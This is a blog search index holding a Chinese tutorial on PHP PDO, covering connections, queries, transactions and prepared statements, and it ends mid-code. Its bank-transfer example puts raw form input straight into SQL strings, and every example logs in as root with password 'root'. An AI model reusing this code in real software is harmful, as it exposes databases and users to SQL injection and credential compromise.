<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>MYSQL数据库基础-PDO</title>
    <url>/2023/04/23/15-PDO/</url>
    <content><![CDATA[<h2 id="1-2-PDO介绍"><a href="#1-2-PDO介绍" class="headerlink" title="1.2  PDO介绍"></a>1.2  PDO介绍</h2><h4 id="1-2-1-连接数据库方式"><a href="#1-2-1-连接数据库方式" class="headerlink" title="1.2.1  连接数据库方式"></a>1.2.1  连接数据库方式</h4><p>方法一：mysql扩展【这种方式php7已经淘汰】<br>方法二：mysqli扩展<br>方法三：PDO扩展</p>
<h4 id="1-2-2-PDO介绍"><a href="#1-2-2-PDO介绍" class="headerlink" title="1.2.2  PDO介绍"></a>1.2.2  PDO介绍</h4><p>PDO（PHP Data Object）扩展为PHP访问各种数据库提供了一个轻量级，一致性的接口。</p>
<p>无论访问什么数据库，都可以通过一致性的接口去操作。</p>
<h4 id="1-2-3开启PDO扩展"><a href="#1-2-3开启PDO扩展" class="headerlink" title="1.2.3	开启PDO扩展"></a>1.2.3	开启PDO扩展</h4><p>开启PDO连接MySQL扩展</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">extension=php_pdo_mysql.dll</span><br></pre></td></tr></table></figure>



<h2 id="1-3-PDO核心类"><a href="#1-3-PDO核心类" class="headerlink" title="1.3 PDO核心类"></a>1.3 PDO核心类</h2><p>1、PDO类：表示PHP和数据库之间的一个连接<br>2、PDOStatement 类<br>​	第一：表示执行数据查询语句（select ,show）后的相关结果集<br>​	第二：预处理对象<br>3、PDOException类：表示PDO的异常</p>
<h2 id="1-4-实例化PDO对象"><a href="#1-4-实例化PDO对象" class="headerlink" title="1.4 实例化PDO对象"></a>1.4 实例化PDO对象</h2><p>语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__construct($dsn,用户名,密码)</span><br></pre></td></tr></table></figure>

<h4 id="1-4-1-DSN"><a href="#1-4-1-DSN" class="headerlink" title="1.4.1 DSN"></a>1.4.1 DSN</h4><p>DSN：data source name，数据源名称，包含的是连接数据库的信息，格式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$dsn=数据库类型:host=主机地址;port=端口号;dbname=数据库名称;charset=字符集</span><br></pre></td></tr></table></figure>

<p>数据库类型：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MySQL数据库	=&gt;	mysql:</span><br><span class="line">oracle数据库	=&gt;	oci:</span><br><span class="line">SQL Server 		=&gt;sqlsrv:</span><br><span class="line">具体驱动类型参见手册“PDO驱动”</span><br></pre></td></tr></table></figure>

<h4 id="1-4-2实例化PDO"><a href="#1-4-2实例化PDO" class="headerlink" title="1.4.2	实例化PDO"></a>1.4.2	实例化PDO</h4><p>实例化PDO的过程就是连接数据库的过程</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dsn</span>=<span class="string">&#x27;mysql:host=localhost;port=3306;dbname=data;charset=utf8&#x27;</span>;</span><br><span class="line"><span class="variable">$pdo</span>=<span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="variable">$dsn</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;root&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$pdo</span>); <span class="comment">//object(PDO)#1 (0) &#123; &#125; </span></span><br></pre></td></tr></table></figure>

<h4 id="1-4-3-注意事项"><a href="#1-4-3-注意事项" class="headerlink" title="1.4.3  注意事项"></a>1.4.3  注意事项</h4><p>1、如果连接的是本地数据库，host可以省略</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dsn</span>=<span class="string">&#x27;mysql:port=3306;dbname=data;charset=utf8&#x27;</span>;</span><br><span class="line"><span class="variable">$pdo</span>=<span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="variable">$dsn</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;root&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$pdo</span>); <span class="comment">//object(PDO)#1 (0) &#123; &#125; </span></span><br></pre></td></tr></table></figure>

<p>2、如果使用的是3306端口，port可以省略</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dsn</span>=<span class="string">&#x27;mysql:dbname=data;charset=utf8&#x27;</span>;</span><br><span class="line"><span class="variable">$pdo</span>=<span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="variable">$dsn</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;root&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$pdo</span>); <span class="comment">//object(PDO)#1 (0) &#123; &#125; </span></span><br></pre></td></tr></table></figure>

<p>3、charset也省略，如果省略，使用的是默认字符编码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dsn</span>=<span class="string">&#x27;mysql:dbname=data&#x27;</span>;</span><br><span class="line"><span class="variable">$pdo</span>=<span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="variable">$dsn</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;root&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$pdo</span>); </span><br></pre></td></tr></table></figure>

<p>4、dbname也可以省略，如果省略就没有选择数据库</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dsn</span>=<span class="string">&#x27;mysql:&#x27;</span>;</span><br><span class="line"><span class="variable">$pdo</span>=<span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="variable">$dsn</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;root&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$pdo</span>); </span><br></pre></td></tr></table></figure>

<p>5、host、port、dbname、charset不区分大小写，没有先后顺序</p>
<p>6、驱动名称不能省略，冒号不能省略（因为冒号是驱动名组成部分），数据库驱动只能小写</p>
<h2 id="1-5-使用PDO"><a href="#1-5-使用PDO" class="headerlink" title="1.5  使用PDO"></a>1.5  使用PDO</h2><h4 id="1-5-1-执行数据操作语句"><a href="#1-5-1-执行数据操作语句" class="headerlink" title="1.5.1  执行数据操作语句"></a>1.5.1  执行数据操作语句</h4><p>方法:$pdo-&gt;exec($sql)，执行数据增、删、改语句，执行成功返回受影响的记录数，如果SQL语句错误返回false。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//1、实例化PDO</span></span><br><span class="line"><span class="variable">$dsn</span>=<span class="string">&#x27;mysql:host=localhost;port=3306;dbname=data;charset=utf8&#x27;</span>;</span><br><span class="line"><span class="variable">$pdo</span>=<span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="variable">$dsn</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;root&#x27;</span>);</span><br><span class="line"><span class="comment">//2执行数据操作语句</span></span><br><span class="line"><span class="comment">//2.1 执行增加</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">if($pdo-&gt;exec(&quot;insert into news values (null,&#x27;bb&#x27;,&#x27;bbbbbb&#x27;,unix_timestamp())&quot;))</span></span><br><span class="line"><span class="comment">    echo &#x27;自动增长的编号是：&#x27;.$pdo-&gt;lastInsertId (),&#x27;&lt;br&gt;&#x27;;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//2.2 执行修改</span></span><br><span class="line"><span class="comment">//echo $pdo-&gt;exec(&quot;update news set title=&#x27;静夜思&#x27; where id in (3,4)&quot;);</span></span><br><span class="line"><span class="comment">//2.3 执行删除</span></span><br><span class="line"><span class="comment">//echo $pdo-&gt;exec(&#x27;delete from news where id=5&#x27;);\</span></span><br><span class="line"><span class="comment">//2.4 完善</span></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;update news set title=&#x27;静夜思1&#x27; where ids in (3,4)&quot;</span>;</span><br><span class="line"><span class="variable">$rs</span>=<span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">exec</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$rs</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;SQL语句执行成功&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$sql</span>, <span class="number">0</span>,<span class="number">6</span>)==<span class="string">&#x27;insert&#x27;</span>)</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;自动增长的编号是：&#x27;</span>.<span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">lastInsertId</span> (),<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;受到影响的记录数是：&#x27;</span>.<span class="variable">$rs</span>,<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">elseif</span>(<span class="variable">$rs</span>===<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;数据没有变化&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">elseif</span>(<span class="variable">$rs</span>===<span class="literal">false</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;SQL语句执行失败&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;错误编号：&#x27;</span>.<span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">errorCode</span>(),<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="comment">//var_dump($pdo-&gt;errorInfo());</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;错误信息：&#x27;</span>.<span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">errorInfo</span>()[<span class="number">2</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="1-5-2-执行数据查询语句"><a href="#1-5-2-执行数据查询语句" class="headerlink" title="1.5.2  执行数据查询语句"></a>1.5.2  执行数据查询语句</h4><p>方法：$pdo-&gt;query($sql)，返回的是PDOStatement对象</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dsn</span>=<span class="string">&#x27;mysql:dbname=data;charset=utf8&#x27;</span>;</span><br><span class="line"><span class="variable">$pdo</span>=<span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="variable">$dsn</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;root&#x27;</span>);</span><br><span class="line"><span class="comment">//1、执行数据查询语句</span></span><br><span class="line"><span class="variable">$stmt</span>=<span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;select * from products&#x27;</span>);</span><br><span class="line"><span class="comment">//var_dump($stmt);        //object(PDOStatement)</span></span><br><span class="line"><span class="comment">//2、获取数据</span></span><br><span class="line"><span class="comment">//2.1  获取二维数组</span></span><br><span class="line"><span class="comment">//$rs=$stmt-&gt;fetchAll();  //默认返回关联和索引数组</span></span><br><span class="line"><span class="comment">//$rs=$stmt-&gt;fetchAll(PDO::FETCH_BOTH);     //返回关联和索引数组</span></span><br><span class="line"><span class="comment">//$rs=$stmt-&gt;fetchAll(PDO::FETCH_NUM);      //返回索引数组</span></span><br><span class="line"><span class="comment">//$rs=$stmt-&gt;fetchAll(PDO::FETCH_ASSOC);    //返回关联数组</span></span><br><span class="line"><span class="comment">//$rs=$stmt-&gt;fetchAll(PDO::FETCH_OBJ);        //返回对象数组</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//2.2  获取一维数组,匹配完成后指针下移一条</span></span><br><span class="line"><span class="comment">//$rs=$stmt-&gt;fetch();     //关联和索引数组</span></span><br><span class="line"><span class="comment">//$rs=$stmt-&gt;fetch(PDO::FETCH_NUM);   //索引数组</span></span><br><span class="line"><span class="comment">//例题：通过while循环获取所有数据</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">while($row=$stmt-&gt;fetch(PDO::FETCH_ASSOC))&#123;</span></span><br><span class="line"><span class="comment">    $rs[]=$row;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">echo &#x27;&lt;pre&gt;&#x27;;</span></span><br><span class="line"><span class="comment">var_dump($rs);</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//3.3  匹配列：匹配当前行的第n列，列的编号从0开始，匹配完毕后指针下移一条</span></span><br><span class="line"><span class="comment">//echo $stmt-&gt;fetchColumn();  //获取当前行的第0列</span></span><br><span class="line"><span class="comment">//echo $stmt-&gt;fetchColumn(1);  //获取当前行的第1列</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//3.4  总行数，总列数</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">echo &#x27;总行数：&#x27;.$stmt-&gt;rowCount(),&#x27;&lt;br&gt;&#x27;;</span></span><br><span class="line"><span class="comment">echo &#x27;总列数：&#x27;.$stmt-&gt;columnCount();</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//3.5 遍历PDOStatement对象（PDOStatement对象是有迭代器的）</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$stmt</span> <span class="keyword">as</span> <span class="variable">$row</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$row</span>[<span class="string">&#x27;proname&#x27;</span>],<span class="string">&#x27;-&#x27;</span>,<span class="variable">$row</span>[<span class="string">&#x27;proprice&#x27;</span>],<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">stdClass类是所有PHP类的父类</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bank</span><br><span class="line">--打印所有信息bank信息    格式：&#123;card&#125;-&#123;money&#125;</span><br><span class="line">--操作两张卡余额 一张-100 一张+100</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="1-5-3-PDO操作事务"><a href="#1-5-3-PDO操作事务" class="headerlink" title="1.5.3   PDO操作事务"></a>1.5.3   PDO操作事务</h4><p>事务：是一个整体，要么一起执行，要么一起回滚</p>
<p>事务的特性：原子性，一致性，隔离性，永久性</p>
<p>需要将多个SQL语句作为一个整体执行，就需要使用到事务</p>
<p>语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">start transaction 或 begin		开启事务</span><br><span class="line">commit	提交事务</span><br><span class="line">rollback	回滚事务</span><br></pre></td></tr></table></figure>

<p>例题</p>
<p>创建测试数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create table bank(</span><br><span class="line">       cardid char(4) primary key comment &#x27;卡号&#x27;,</span><br><span class="line">       balance decimal(10,2) not null comment &#x27;余额&#x27;</span><br><span class="line">)engine=innodb charset=utf8 comment &#x27;银行卡号表&#x27;</span><br><span class="line"></span><br><span class="line">insert into bank values (&#x27;1001&#x27;,1000),(&#x27;1002&#x27;,1)</span><br></pre></td></tr></table></figure>

<p>PDO操作事务</p>
<p> $pdo-&gt;beginTransaction();   &#x2F;&#x2F;开启事务</p>
<p>$pdo-&gt;commit ();    &#x2F;&#x2F;提交事务</p>
<p>$pdo-&gt;rollBack ();  &#x2F;&#x2F;回滚事务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if(!empty($_POST))&#123;</span><br><span class="line">    $dsn=&#x27;mysql:dbname=data;charset=utf8&#x27;;</span><br><span class="line">    $pdo=new PDO($dsn,&#x27;root&#x27;,&#x27;root&#x27;);</span><br><span class="line">    $out=$_POST[&#x27;card_out&#x27;];    //转出卡号</span><br><span class="line">    $in=$_POST[&#x27;card_in&#x27;];      //注入卡号</span><br><span class="line">    $money=$_POST[&#x27;money&#x27;];     //金额</span><br><span class="line">    $pdo-&gt;beginTransaction();   //开启事务</span><br><span class="line">    //转账</span><br><span class="line">    $flag1=$pdo-&gt;exec(&quot;update bank set balance=balance-$money where cardid=&#x27;$out&#x27;&quot;);</span><br><span class="line">    $flag2=$pdo-&gt;exec(&quot;update bank set balance=balance+$money where cardid=&#x27;$in&#x27;&quot;);</span><br><span class="line">    //查看转出的账号是否大于0，大于0返回true，否则返回false</span><br><span class="line">    $stmt=$pdo-&gt;query(&quot;select balance from bank where cardid=&#x27;$out&#x27;&quot;); </span><br><span class="line">    $flag3=$stmt-&gt;fetchColumn()&gt;=0?1:0;</span><br><span class="line">    </span><br><span class="line">    if($flag1 &amp;&amp; $flag2 &amp;&amp; $flag3)&#123;</span><br><span class="line">        $pdo-&gt;commit ();    //提交事务</span><br><span class="line">        echo &#x27;转账成功&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        $pdo-&gt;rollBack ();  //回滚事务</span><br><span class="line">        echo &#x27;转账失败&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;</span><br><span class="line">    转出卡号： &lt;input type=&quot;text&quot; name=&quot;card_out&quot; id=&quot;&quot;&gt; &lt;br&gt;</span><br><span class="line">    转入卡号： &lt;input type=&quot;text&quot; name=&quot;card_in&quot; id=&quot;&quot;&gt; &lt;br&gt;</span><br><span class="line">    金额：&lt;input type=&quot;text&quot; name=&quot;money&quot; id=&quot;&quot;&gt; &lt;br&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>

<p>小结：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$pdo-&gt;beginTransaction()	开启事务</span><br><span class="line">$pdo-&gt;commit ()			提交事务</span><br><span class="line">$pdo-&gt;rollBack()			回滚事务</span><br></pre></td></tr></table></figure>



<h4 id="1-5-4-PDO操作预处理"><a href="#1-5-4-PDO操作预处理" class="headerlink" title="1.5.4   PDO操作预处理"></a>1.5.4   PDO操作预处理</h4><p><strong>复习MySQL中预处理</strong></p>
<p>预处理好处：编译一次多次执行，用来解决一条SQL语句多次执行的问题，提高了执行效率。</p>
<p>预处理语句：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">prepare 预处理名字 from &#x27;sql语句&#x27;</span><br></pre></td></tr></table></figure>

<p>执行预处理</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">execute 预处理名字 [using 变量]</span><br></pre></td></tr></table></figure>



<p><strong>PDO中的预处理——位置占位符</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$dsn</span>=<span class="string">&#x27;mysql:dbname=data;charset=utf8&#x27;</span>;</span><br><span class="line">    <span class="variable">$pdo</span>=<span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="variable">$dsn</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;root&#x27;</span>);</span><br><span class="line">    <span class="comment">//创建预处理对象</span></span><br><span class="line">    <span class="variable">$stmt</span>=<span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;insert into bank values (?,?)&quot;</span>);   <span class="comment">//?是占位符</span></span><br><span class="line">    <span class="comment">//执行预处理</span></span><br><span class="line">    <span class="variable">$cards</span>=[</span><br><span class="line">        [<span class="string">&#x27;1003&#x27;</span>,<span class="number">500</span>],</span><br><span class="line">        [<span class="string">&#x27;1004&#x27;</span>,<span class="number">100</span>]</span><br><span class="line">    ];</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$cards</span> <span class="keyword">as</span> <span class="variable">$card</span>)&#123;</span><br><span class="line">        <span class="comment">//绑定参数，并执行预处理,</span></span><br><span class="line">        <span class="comment">//方法一：</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        $stmt-&gt;bindParam(1, $card[0]);  //占位符的位置从1开始</span></span><br><span class="line"><span class="comment">        $stmt-&gt;bindParam(2, $card[1]);</span></span><br><span class="line"><span class="comment">        $stmt-&gt;execute();               //执行预处理</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="comment">//方法二：</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        $stmt-&gt;bindValue(1, $card[0]);</span></span><br><span class="line"><span class="comment">        $stmt-&gt;bindValue(2, $card[1]);</span></span><br><span class="line"><span class="comment">        $stmt-&gt;execute();</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="comment">//方法三：如果占位符的顺序和数组的顺序一致，可以直接传递数组</span></span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>(<span class="variable">$card</span>);  </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">准备两个预处理语句</span><br><span class="line">预处理一：   查询指定卡号的语句	（一个参数）</span><br><span class="line">预处理二：	更新指定卡号  增加/减少（-100）指定余额	（两个参数）</span><br><span class="line"></span><br><span class="line">先执行预处理二语句 </span><br><span class="line">再执行 </span><br><span class="line">预处理一语句</span><br></pre></td></tr></table></figure>



<p><strong>PDO中的预处理——参数占位符</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dsn</span>=<span class="string">&#x27;mysql:dbname=data;charset=utf8&#x27;</span>;</span><br><span class="line"><span class="variable">$pdo</span>=<span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="variable">$dsn</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;root&#x27;</span>);</span><br><span class="line"><span class="comment">//创建预处理对象</span></span><br><span class="line"><span class="variable">$stmt</span>=<span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;insert into bank values (:p1,:p2)&quot;</span>);   <span class="comment">//:p1,:p2是参数占位符</span></span><br><span class="line"><span class="comment">//执行预处理</span></span><br><span class="line"><span class="variable">$cards</span>=[</span><br><span class="line">    [<span class="string">&#x27;p1&#x27;</span>=&gt;<span class="string">&#x27;1003&#x27;</span>,<span class="string">&#x27;p2&#x27;</span>=&gt;<span class="number">500</span>],</span><br><span class="line">    [<span class="string">&#x27;p1&#x27;</span>=&gt;<span class="string">&#x27;1004&#x27;</span>,<span class="string">&#x27;p2&#x27;</span>=&gt;<span class="number">1000</span>]</span><br><span class="line">];</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$cards</span> <span class="keyword">as</span> <span class="variable">$card</span>)&#123;</span><br><span class="line">    <span class="comment">//方法一：</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    $stmt-&gt;bindParam(&#x27;:p1&#x27;, $card[&#x27;p1&#x27;]);</span></span><br><span class="line"><span class="comment">    $stmt-&gt;bindParam(&#x27;:p2&#x27;, $card[&#x27;p2&#x27;]);</span></span><br><span class="line"><span class="comment">    $stmt-&gt;execute();</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="comment">//方法二：但数组的下标和参数名一致的时候就可以直接传递关联数组</span></span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>(<span class="variable">$card</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>小结：</p>
<p>1、?是位置占位符</p>
<p>2、参数占位符以冒号开头</p>
<p>3、$stmt-&gt;bindParam()和$stmt-&gt;bindValue()区别</p>
<p>4、预处理的好处</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a)提高执行效率</span><br><span class="line">b)提高安全性</span><br></pre></td></tr></table></figure>



<h2 id="1-6-PDO异常处理"><a href="#1-6-PDO异常处理" class="headerlink" title="1.6  PDO异常处理"></a>1.6  PDO异常处理</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="variable">$dsn</span>=<span class="string">&#x27;mysql:dbname=data;charset=utf8&#x27;</span>;</span><br><span class="line">    <span class="variable">$pdo</span>=<span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="variable">$dsn</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;root&#x27;</span>);</span><br><span class="line">    <span class="comment">//这是PDO错误模式属性，PDO自动抛出异常</span></span><br><span class="line">    <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">setAttribute</span>(PDO::<span class="variable constant_">ATTR_ERRMODE</span>, PDO::<span class="variable constant_">ERRMODE_EXCEPTION</span>);</span><br><span class="line">    <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;select * from newsssssss&#x27;</span>);  <span class="comment">//自动抛出异常</span></span><br><span class="line">    </span><br><span class="line">&#125; <span class="keyword">catch</span> (PDOException <span class="variable">$ex</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;错误信息：&#x27;</span>.<span class="variable">$ex</span>-&gt;<span class="title function_ invoke__">getMessage</span>(),<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;错误文件：&#x27;</span>.<span class="variable">$ex</span>-&gt;<span class="title function_ invoke__">getFile</span>(),<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;错误行号：&#x27;</span>.<span class="variable">$ex</span>-&gt;<span class="title function_ invoke__">getLine</span>();</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>小结：</p>
<p>1、PDOException是PDO的异常类</p>
<p>2、实例化PDO会自动抛出异常</p>
<p>3、其他操作不会抛出异常，需要设置PDO的异常模式</p>
<p>4、PDO异常模式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PDO::ERRMODE_EXCEPTION	抛出异常</span><br><span class="line">PDO::ERRMODE_SILENT		中断</span><br><span class="line">PDO::ERRMODE_WARNING	警告</span><br></pre></td></tr></table></figure>



<h2 id="1-7-单例MyPDO类"><a href="#1-7-单例MyPDO类" class="headerlink" title="1.7  单例MyPDO类"></a>1.7  单例MyPDO类</h2><h4 id="1-7-1-步骤"><a href="#1-7-1-步骤" class="headerlink" title="1.7.1  步骤"></a>1.7.1  步骤</h4><p>1、单例模式</p>
<p>2、初始化参数</p>
<p>3、连接数据库</p>
<p>4、执行增删改</p>
<p>5、执行查询</p>
<p>​	a）返回二维数组</p>
<p>​	b）返回一维数组</p>
<p>​	c）返回一行一列</p>
<h4 id="1-7-2-代码实现"><a href="#1-7-2-代码实现" class="headerlink" title="1.7.2 代码实现"></a>1.7.2 代码实现</h4><p>第一部分：单例、初始化参数、实例化PDO</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyPDO</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$type</span>;      <span class="comment">//数据库类别</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$host</span>;      <span class="comment">//主机地址</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$port</span>;      <span class="comment">//端口号</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$dbname</span>;    <span class="comment">//数据库名</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$charset</span>;   <span class="comment">//字符集</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>;      <span class="comment">//用户名</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$pwd</span>;       <span class="comment">//密码</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$pdo</span>;       <span class="comment">//保存PDO对象</span></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$instance</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$param</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">initParam</span>(<span class="variable">$param</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">initPDO</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getInstance</span>(<span class="params"><span class="variable">$param</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">self</span>::<span 